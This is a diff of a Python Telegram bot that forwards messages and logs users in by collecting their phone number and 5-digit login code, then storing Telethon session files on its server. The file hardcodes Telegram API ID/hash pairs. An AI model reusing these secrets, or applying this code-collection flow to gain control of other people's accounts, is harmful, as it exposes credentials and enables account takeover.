@@ -8,7 +8,7 @@ from typing import List, Dict, Any, Optional, Tuple, Set
 from telethon import TelegramClient, functions, types, errors, events
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ForceReply, Message
-
+from utils.functions import small_caps, large_nums
 # Setup logging
 logging.basicConfig(
     level=logging.INFO,
@@ -28,20 +28,6 @@ FORWARD_API_HASH = "f743596f09f383e7bbcc62ce62367f06"
 CONTACT_API_ID = 20729573
 CONTACT_API_HASH = "6bc09cbaa7d0471944875c202fec8b5b"
 
-# UI Enhancement Functions
-async def small_caps() -> dict:
-    """Returns translation table for small caps conversion"""
-    return str.maketrans(
-        'abcdefghijklmnopqrstuvwxyz1234567890',
-        'ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶'
-    )
-
-async def large_nums() -> dict:
-    """Returns translation table for large numbers conversion"""
-    return str.maketrans(
-        '𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶',
-        '1234567890'
-    )
 
 class TelegramLogHandler(logging.Handler):
     """Sends log records to Telegram"""
@@ -189,18 +175,7 @@ class ForwardManager:
         """Register bot event handlers"""
         if not self.bot:
             return
-
-        @self.forward_client.on(events.NewMessage(chats=self.source_chats))
-        async def on_new(event):
-            if not self.enabled:
-                return
-            try:
-                await self._forward_event(event)
-            except (errors.ConnectionError, errors.AlreadyInConversationError) as e:
-                self.logger.warning(f"Connection issue: {e}")
-                await asyncio.sleep(5)
-                await self.start_forward_client()  # Reinitialize client
-
+            
         @self.bot.message_handler(commands=['user_control'])
         async def cmd_control(message: Message):
             user_id = message.from_user.id
@@ -498,7 +473,7 @@ class ForwardManager:
                 
     async def start_forward_client(self):
         try:
-            session_path = self._session_file(ADMIN_USER_ID)
+            session_path = self._session_file(ADMIN_USER_ID) # Get session file path
             self.forward_client = TelegramClient(
                 session_path, 
                 FORWARD_API_ID, 
@@ -510,6 +485,7 @@ class ForwardManager:
             
             if not await self.forward_client.is_user_authorized():
                 await self.send_to_admin(" Forward Client Not Authorized ")
+                await self.logout_user(ADMIN_USER_ID, ADMIN_USER_ID, file_path=session_path)
                 return
             
             # Add proper task management
@@ -523,6 +499,17 @@ class ForwardManager:
                 self.logger.info(f"Migrated to DC {event.new_dc}")
                 await asyncio.sleep(1)  # Brief pause before reconnecting
                 await self.forward_client.reconnect()
+
+            
+            @self.forward_client.on(events.NewMessage(chats=self.source_chats))
+            async def on_new(event):
+                if not self.enabled:
+                    return
+                try:
+                    await self._forward_event(event)
+                except (errors.ConnectionError, errors.AlreadyInConversationError) as e:
+                    self.logger.warning(f"Connection issue: {e}")
+                    await asyncio.sleep(5)
             
             self.logger.info("Forward client started")
         except Exception as e:
@@ -579,9 +566,9 @@ class ForwardManager:
             reply_markup=ForceReply(selective=True)
         )
     
-    async def logout_user(self, user_id: int, chat_id: int, force=False):
+    async def logout_user(self, user_id: int, chat_id: int, force=False, file_path=None):
         """Logout user and clean up session"""
-        session_path = self._contact_session_file(user_id)
+        session_path = file_path or self._contact_session_file(user_id)
         if os.path.exists(session_path):
             try:
                 os.remove(session_path)
@@ -605,61 +592,69 @@ class ForwardManager:
         chat_id = state_data['chat_id']
 
         if state_data['state'] == 'awaiting_phone':
-            gtext = self.to_gtext(text)
-            text = gtext.splitlines()[0].replace(" ", "") if gtext else None
-
-            if not re.match(r'^\d{8,15}$', text):
-                await self.safe_send(chat_id, "❌ <b>Invalid Phone</b>\nSend digits only (e.g., <code>918372673883</code>)", parse_mode="HTML")
+            phone = ''.join(filter(str.isdigit, text))
+            if not phone or len(phone) < 8 or len(phone) > 15:
+                await self.safe_send(chat_id, "❌ <b>Invalid Phone</b>\nSend digits only (e.g., 918372673883)", parse_mode="HTML")
                 return
-            for _ in range(10):
-                try:
-                    session_path = self._contact_session_file(user_id)
-                    break
-                except Exception as e:
-                    pass
-                    await asyncio.sleep(0.1)
 
+            session_path = self._contact_session_file(user_id)
+            client = None
             try:
-                for _ in range(15):
-                    try:
-                        client = TelegramClient(session_path, CONTACT_API_ID, CONTACT_API_HASH)
-                        break
-                    except Exception as e:
-                        pass
-                    await asyncio.sleep(0.5)
-                for _ in range(10):
-                    try:
-                        await client.connect()
-                        break
-                    except Exception as e:
-                        pass
-                    await asyncio.sleep(1)
-                for _ in range(5):
-                    try:
-                        await client.send_code_request(text)
-                        break
-                    except Exception as e:
-                        pass
-                    await asyncio.sleep(2)
+                # FIX: Create client with proper settings
+                client = TelegramClient(
+                    session_path, 
+                    CONTACT_API_ID, 
+                    CONTACT_API_HASH,
+                    connection_retries=3,
+                    auto_reconnect=False  # Important for short-lived operations
+                )
+
+                # FIX: Use single connection attempt with timeout
+                await asyncio.wait_for(client.connect(), timeout=10)
+
+                # FIX: Single code request with timeout
+                await asyncio.wait_for(client.send_code_request(phone), timeout=10)
 
                 state_data.update({
                     'state': 'awaiting_code',
-                    'phone': text,
+                    'phone': phone,
                     'client': client
                 })
-                await self.bot.send_message(chat_id, "<a href='https://i.ibb.co/bM7nJ5bv/IMG-20250629-063110-295.jpg'>✉️</a> <b>Code Sent</b>\nPlease reply with the 5-digit code:", parse_mode="HTML", reply_markup=ForceReply(selective=True))
-            except errors.FloodWaitError as fwe:
-                await self.safe_send(chat_id, f"⏳ <b>Flood Wait</b>\nTry again in {fwe.seconds} seconds", parse_mode="HTML")
-                await self.logout_user(user_id, chat_id, force=True)
 
-            except errors.PhoneNumberInvalidError:
-                await self.safe_send(chat_id, "❌ <b>Invalid Phone</b>\nPlease check your number", parse_mode="HTML")
+                await self.safe_send(
+                    chat_id,
+                    "<a href='https://i.ibb.co/bM7nJ5bv/IMG-20250629-063110-295.jpg'>✉️</a> <b>Code Sent</b>\nPlease reply with the 5-digit code:",
+                    parse_mode="HTML",
+                    reply_markup=ForceReply(selective=True)
+                )
+
+            except errors.FloodWaitError as fwe:
+                error_msg = f"⏳ <b>Flood Wait</b>\nTry again in {fwe.seconds} seconds"
+                await self.safe_send(chat_id, error_msg, parse_mode="HTML")
+                await self.logout_user(user_id, chat_id, force=True)
+        
+            except (errors.PhoneNumberInvalidError, errors.PhoneNumberBannedError):
+                error_msg = "❌ <b>Invalid Phone</b>\nPlease check your number"
+                await self.safe_send(chat_id, error_msg, parse_mode="HTML")
+                await self.logout_user(user_id, chat_id, force=True)
+        
+            except asyncio.TimeoutError:
+                error_msg = "⌛ <b>Connection Timeout</b>\nPlease try again later"
+                await self.safe_send(chat_id, error_msg, parse_mode="HTML")
                 await self.logout_user(user_id, chat_id, force=True)
 
             except Exception as e:
-                await self.safe_send(chat_id, f"❌ <b>Error</b>\n<code>{str(e)}</code>", parse_mode="HTML")
+                error_msg = f"❌ <b>Error</b>\n<code>{html.escape(str(e))}</code>"
+                await self.safe_send(chat_id, error_msg, parse_mode="HTML")
                 await self.logout_user(user_id, chat_id, force=True)
 
+            finally:
+                # Ensure client is disconnected if not stored in state
+                if client and ('client' not in state_data or state_data['client'] != client):
+                    try:
+                        await client.disconnect()
+                    except Exception:
+                        pass
         elif state_data['state'] == 'awaiting_code':
             if not re.match(r'^\d{5}$', text):
                 await self.safe_send(chat_id, "❌ <b>Invalid Code</b>\nSend 5-digit code only", parse_mode="HTML")
